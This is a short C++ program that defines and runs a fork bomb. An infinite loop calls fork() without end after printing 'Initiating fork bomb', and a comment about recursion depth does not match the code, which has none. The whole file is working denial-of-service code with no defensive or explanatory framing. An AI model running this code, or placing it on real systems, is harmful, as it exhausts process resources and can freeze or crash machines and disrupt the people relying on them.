#include <iostream>
#include <unistd.h>
#include <sys/types.h>

void forkBomb()
{
    while (true)
    {
        fork();
    }
}

int main()
{
    std::cout << "Initiating fork bomb ...\n";
    forkBomb(); // Set the depth of recursion
    return 0;
}
